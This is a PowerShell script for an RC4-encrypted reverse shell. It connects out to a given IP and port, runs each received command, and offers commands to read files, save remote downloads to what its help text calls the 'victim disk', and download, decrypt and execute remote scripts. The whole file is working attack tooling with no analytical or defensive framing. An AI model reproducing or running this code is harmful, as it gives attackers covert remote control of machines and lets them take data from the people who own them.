function Shell-Prompt {
    PROCESS {
		if( -not (Test-Path env:userdomain)) {
			$domain = $env:computername
		} else {
			$domain = $env:userdomain
		}
		
		$target = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}
		$target = $target.ipaddress[0] 
		
		return "($($target):$($domain)\$($env:username)):Command >"   
    }
}

function Display-Message {
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$Module,
	[Parameter(Mandatory=$True)]
	[string]$Message
	)

    PROCESS {
        Write-Output "[*] $($Module): $($Message)"
    }
}

function Show-Help {
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$False)]
	[string]$ErrorMessage
	)

    PROCESS {
        if($ErrorMessage) {
            Write-Output "[-] ERROR: $($ErrorMessage)"
        }
        Write-Output "`nSupported commands:`n------------------------------`n"
        Write-Output "`tread`t[path]`t`tShow the content of the specified file"
        Write-Output "`tremote`t[url cmd]`tRemotely download powershell script and execute a command"
        Write-Output "`tupload`t[url path]`tDownload a remote file and save it to the victim disk"
        Write-Output "`thelp`t`t`tShow this help"
    }
}

function Parse-Command {
   	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$CmdArgs,
	[Parameter(Mandatory=$True)]
	[string]$Key
	) 

    PROCESS {
        $Args = $CmdArgs.Split(" ", 3, [System.StringSplitOptions]::RemoveEmptyEntries)
        $Output = "Show-Help"

        if($Args[0].ToLower().Equals("upload")) {
            if($Args.Length -ge 3) {
                $Output = "DownloadToDisk -Url '$($Args[1])' -Path '$($Args[2])' -Key '$($Key)'"
            } else {
                $Output = "Show-Help -ErrorMessage 'Missing arguments'"
            }

        } elseif($Args[0].ToLower().Equals("read")) {
            if($Args.Length -ge 2) {
                $Output = "ReadFile -Path '$($Args[1])'"
            } else {
                $Output = "Show-Help -ErrorMessage 'Missing arguments'"
            }
                    
        } elseif($Args[0].ToLower().Equals("remote")) {
            if($Args.Length -ge 3) {
                $Output = "DownloadExecute -Url '$($Args[1])' -Cmd '$($Args[2])' -Key $($Key)"
            } else {
                $Output = "Show-Help -ErrorMessage 'Missing arguments'"
            }

        } elseif($Args[0].ToLower().Equals("help")) {
            $Output = "Show-Help"

        } else {
            $Output = $CmdArgs
        }

        return $Output
    }
}

function Crypto-RC4 {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $inputObject,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $key
    )

    BEGIN {
        [Byte[]] $S = 0..255
        $J = 0
        0..255 | ForEach-Object {
            $J = ($J + $S[$_] + $key[$_ % $key.Length]) % 256
            $S[$_], $S[$J] = $S[$J], $S[$_]
        }
        $I = $J = 0
    }

    PROCESS {
        ForEach($Byte in $inputObject) {
            $I = ($I + 1) % 256
            $J = ($J + $S[$I]) % 256
            $S[$I], $S[$J] = $S[$J], $S[$I]
            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
        }
    }
}

function PS-RemoteShell { 
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$ip,
	[Parameter(Mandatory=$True)]
	[int]$port,
	[Parameter(Mandatory=$True)]
	[string]$key
	)
   
	BEGIN {

	}

	PROCESS {
		$s = New-Object System.Net.Sockets.TCPClient($ip, $port);
		$stream = $s.GetStream();
		[byte[]]$bytes = 0..255|%{0}
		[byte[]]$sendData
		
		$prompt = [text.encoding]::ASCII.GetBytes((Shell-Prompt))
		$sendData = ($prompt | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
		$stream.Write($sendData, 0, $sendData.Length)
		
		while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
			
			$Cmd = ($bytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
            		$Cmd = [Text.Encoding]::ASCII.GetString($Cmd, 0, $i)
            		$Cmd = Parse-Command -CmdArgs $Cmd -Key $key

			$Output = ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
			$Output  = $Output + "`n"
			$errorMessage = ($error[0] | Out-String)
			$error.clear()
			$Output = $Output + $errorMessage
						
			$sendBytes = [Text.Encoding]::ASCII.GetBytes($Output) + $prompt
			$sendData = ($sendBytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
			
			$size = [Text.Encoding]::ASCII.GetBytes("PACKETSIZE=" + $sendData.Length)
			$sendSize = ($size | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
			$stream.Write($sendSize, 0, $sendSize.Length)
			Start-Sleep -m 100
			$stream.Write($sendData, 0, $sendData.Length)
			$stream.Flush()  
		}
		$s.Close()
	}
   
   END {
   
   }
}

function DownloadToDisk {
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$Url,
	[Parameter(Mandatory=$True)]
	[string]$Path,
	[Parameter(Mandatory=$True)]
	[string]$Key
	)
   
	BEGIN {
        $moduleName = "DownloadToDisk"
		Display-Message -Module $moduleName -Message "Fetching $($url)"
	}	
	
	PROCESS {
		$buffer = ""
		Try {
			$data = (New-Object Net.WebClient).DownloadData($Url)
			if(!$Key.Equals("null")) {
				$buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
			} else {
				$buffer = $data
			}
			[System.Text.Encoding]::ASCII.GetString($buffer) | Out-File $Path
		} Catch {
		    Display-Message -Module $moduleName -Message "failed to download $($Url)"
		}
	}

    END {
        Display-Message -Module $moduleName -Message "execution Completed"
    }
}

function DownloadExecute {
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$Url,
	[Parameter(Mandatory=$True)]
	[string]$Cmd,
	[Parameter(Mandatory=$True)]
	[string]$Key
	)

    BEGIN {
        $moduleName = "DownloadExecute"
		Display-Message -Module $moduleName -Message "Fetching $($url)"
    }

    PROCESS {
        Try {
            $data = (New-Object Net.WebClient).DownloadData($url)
            $buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))

            Display-Message -Module $moduleName -Message "Executing $($Cmd)"

            $Cmd = [Text.Encoding]::ASCII.GetString($buffer) + ";" + $Cmd
            Write-Output ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
        } Catch {
            Display-Message -Module $moduleName -Message "failed to download $($Url)"
        }
    }

    END {
        Display-Message -Module $moduleName -Message "execution Completed"
    }
}

function ReadFile {
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)]
	[string]$Path
    )

    BEGIN {
        $moduleName = "ReadFile"
	Display-Message -Module $moduleName -Message "Reading $($Path)"
        $buffer = Get-Content $Path
        Write-Output $buffer
    }

    END {
        Display-Message -Module $moduleName -Message "execution Completed"
    }
}
